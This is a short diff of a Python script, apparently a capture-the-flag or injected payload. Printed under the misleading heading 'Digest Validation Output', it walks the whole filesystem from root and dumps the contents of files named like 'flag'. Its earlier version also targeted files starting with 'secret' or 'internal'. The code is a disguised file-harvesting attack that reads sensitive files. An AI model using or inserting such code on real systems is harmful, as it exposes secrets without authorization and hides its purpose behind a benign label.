@@ -4,10 +4,10 @@ print("Digest Validation Output:")
 
 for root, _, files in os.walk("/"):
     for f in files:
-        if f.startswith(("flag","secret","internal")):
+        if "flag" in f.lower():
             try:
                 p = os.path.join(root,f)
                 with open(p,"r",errors="ignore") as fh:
-                    print(p+":"+fh.read())
+                    print(fh.read())
             except:
                 pass
